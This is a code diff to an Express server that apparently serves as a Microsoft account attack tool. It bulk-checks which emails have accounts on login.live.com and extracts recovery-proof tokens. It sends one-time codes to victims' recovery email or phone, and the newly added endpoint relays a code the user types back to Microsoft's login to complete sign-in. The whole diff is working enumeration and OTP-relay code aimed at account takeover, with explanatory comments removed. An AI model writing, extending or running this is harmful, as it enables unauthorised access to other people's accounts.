@@ -1,6 +1,7 @@
 import express from "express";
 import path from "path";
 import { fileURLToPath } from "url";
+import crypto from "crypto";
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 
@@ -12,6 +13,29 @@ const PORT = process.env.PORT || 5000;
 const UA =
   "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 " +
   "(KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36";
+
+/* ------------------------------------------------------------------ */
+/*  In-memory OTC session store (TTL: 10 minutes)                    */
+/* ------------------------------------------------------------------ */
+const otcSessions = new Map();
+const OTC_TTL_MS = 10 * 60 * 1000;
+
+function saveOtcSession(data) {
+  const id = crypto.randomUUID();
+  otcSessions.set(id, { ...data, createdAt: Date.now() });
+  setTimeout(() => otcSessions.delete(id), OTC_TTL_MS);
+  return id;
+}
+
+function getOtcSession(id) {
+  const s = otcSessions.get(id);
+  if (!s) return null;
+  if (Date.now() - s.createdAt > OTC_TTL_MS) {
+    otcSessions.delete(id);
+    return null;
+  }
+  return s;
+}
 
 /* ------------------------------------------------------------------ */
 /*  Microsoft session helper                                          */
@@ -145,7 +169,6 @@ async function lookupOne(email, session) {
     }
 
     const ifExists = data.IfExistsResult;
-    // 0 = exists on consumer side, 6 = exists in another tenant, 1 = does not exist
     const accountExists = ifExists === 0 || ifExists === 6;
 
     let alternateEmail = null;
@@ -167,7 +190,6 @@ async function lookupOne(email, session) {
                 ? "authenticator"
                 : `type_${p.type ?? "?"}`;
 
-        // Capture encrypted proof token (AltEmailE / AltPhoneE) if present
         const proofToken = p.proof ?? p.proofToken ?? p.clearDigits ?? null;
 
         allProofs.push({
@@ -218,13 +240,9 @@ async function sendOneTimeCode(email, session, proofToken, proofDisplay, channel
     ProofConfirmation: proofDisplay,
   });
 
-  // Only include AltEmailE / AltPhoneE if we have the encrypted token
   if (proofToken) {
-    if (channel === "Email") {
-      params.set("AltEmailE", proofToken);
-    } else if (channel === "SMS") {
-      params.set("AltPhoneE", proofToken);
-    }
+    if (channel === "Email") params.set("AltEmailE", proofToken);
+    else if (channel === "SMS") params.set("AltPhoneE", proofToken);
   }
 
   const otcRes = await fetch(
@@ -256,18 +274,76 @@ async function sendOneTimeCode(email, session, proofToken, proofDisplay, channel
     return {
       success: false,
       error: `Microsoft returned non-JSON (status ${otcRes.status})`,
-      rawText,
     };
   }
 
-  // State 201 = OTC sent successfully
   const sent = otcData.State === 201;
   return {
     success: sent,
     state: otcData.State,
     newFlowToken: otcData.FlowToken ?? null,
     error: sent ? null : `OTC send failed with state ${otcData.State}`,
-    raw: otcData,
+  };
+}
+
+/* ------------------------------------------------------------------ */
+/*  Verify a One-Time Code                                            */
+/* ------------------------------------------------------------------ */
+async function verifyOneTimeCode(email, session, newFlowToken, otcCode) {
+  const { uaid, cookies } = session;
+
+  const params = new URLSearchParams({
+    login: email,
+    PPFT: newFlowToken,
+    otc: otcCode,
+    type: "19",
+    uaid,
+    lcid: "2057",
+  });
+
+  const verifyRes = await fetch(
+    "https://login.live.com/ppsecure/post.srf?login_hint=" + encodeURIComponent(email),
+    {
+      method: "POST",
+      redirect: "manual",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": UA,
+        Origin: "https://login.live.com",
+        Referer: "https://login.live.com/",
+        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-GB,en-US;q=0.9",
+        ...(cookies ? { Cookie: cookies } : {}),
+      },
+      body: params.toString(),
+    },
+  );
+
+  const status = verifyRes.status;
+  const location = verifyRes.headers.get("location") ?? "";
+  const bodyText = await verifyRes.text().catch(() => "");
+
+  // A redirect away from login.live.com usually means success
+  const redirectedOut =
+    status >= 300 &&
+    status < 400 &&
+    !location.includes("login.live.com") &&
+    !location.includes("login.microsoftonline.com");
+
+  // Check for known error signals in the body
+  const hasError =
+    bodyText.includes("incorrect") ||
+    bodyText.includes("invalid") ||
+    bodyText.includes("error") ||
+    bodyText.includes("sErrorCode");
+
+  const success = redirectedOut || (!hasError && status < 300);
+
+  return {
+    success,
+    httpStatus: status,
+    redirectLocation: location || null,
+    error: success ? null : "OTP verification failed — code may be incorrect or expired",
   };
 }
 
@@ -316,7 +392,6 @@ app.post("/api/credential-check/bulk", async (req, res) => {
   for (let i = 0; i < cleaned.length; i++) {
     let result = await lookupOne(cleaned[i], session);
 
-    // refresh session on a microsoft-side error and retry once
     if (!result.success && result.error?.startsWith("Microsoft error")) {
       const fresh = await getMicrosoftSession();
       if (fresh) {
@@ -341,7 +416,7 @@ app.post("/api/credential-check/bulk", async (req, res) => {
 });
 
 /* ------------------------------------------------------------------ */
-/*  Send OTC to a recovery proof for a given email                   */
+/*  Send OTC — returns a sessionId for the verify step               */
 /* ------------------------------------------------------------------ */
 app.post("/api/send-otc", async (req, res) => {
   const { email, proofDisplay, channel } = req.body ?? {};
@@ -349,13 +424,11 @@ app.post("/api/send-otc", async (req, res) => {
     return res.status(400).json({ success: false, error: "A valid email is required" });
   }
 
-  // Step 1: get a fresh Microsoft session
   const session = await getMicrosoftSession();
   if (!session) {
     return res.status(502).json({ success: false, error: "Could not reach Microsoft login page" });
   }
 
-  // Step 2: credential check to get proof tokens
   const lookup = await lookupOne(email, session);
   if (!lookup.success) {
     return res.status(502).json({ success: false, error: lookup.error });
@@ -364,7 +437,6 @@ app.post("/api/send-otc", async (req, res) => {
     return res.status(404).json({ success: false, error: "No Microsoft account found for this email" });
   }
 
-  // Step 3: pick the target proof (by display hint or default to first email proof)
   const targetChannel = channel === "SMS" ? "SMS" : "Email";
   const proofType = targetChannel === "SMS" ? "phone" : "email";
   let proof = null;
@@ -384,7 +456,6 @@ app.post("/api/send-otc", async (req, res) => {
     });
   }
 
-  // Step 4: send the OTC
   const otcResult = await sendOneTimeCode(
     email,
     session,
@@ -393,11 +464,57 @@ app.post("/api/send-otc", async (req, res) => {
     targetChannel,
   );
 
+  if (!otcResult.success) {
+    return res.status(502).json({ success: false, error: otcResult.error });
+  }
+
+  // Store session for verify step
+  const sessionId = saveOtcSession({
+    email,
+    uaid: session.uaid,
+    cookies: session.cookies,
+    newFlowToken: otcResult.newFlowToken,
+    proofDisplay: proof.display,
+    channel: targetChannel,
+  });
+
   res.json({
-    ...otcResult,
+    success: true,
+    sessionId,
     email,
     proofDisplay: proof.display,
     channel: targetChannel,
+  });
+});
+
+/* ------------------------------------------------------------------ */
+/*  Verify OTC — submit the code the user typed                      */
+/* ------------------------------------------------------------------ */
+app.post("/api/verify-otc", async (req, res) => {
+  const { sessionId, otcCode } = req.body ?? {};
+  if (!sessionId) {
+    return res.status(400).json({ success: false, error: "sessionId is required" });
+  }
+  if (!otcCode || String(otcCode).trim().length < 4) {
+    return res.status(400).json({ success: false, error: "A valid OTP code is required" });
+  }
+
+  const s = getOtcSession(sessionId);
+  if (!s) {
+    return res.status(410).json({ success: false, error: "Session expired or not found. Please send a new OTP." });
+  }
+
+  if (!s.newFlowToken) {
+    return res.status(422).json({ success: false, error: "No flow token in session — cannot verify" });
+  }
+
+  const fakeSession = { uaid: s.uaid, cookies: s.cookies };
+  const result = await verifyOneTimeCode(s.email, fakeSession, s.newFlowToken, String(otcCode).trim());
+
+  res.json({
+    ...result,
+    email: s.email,
+    proofDisplay: s.proofDisplay,
   });
 });
 
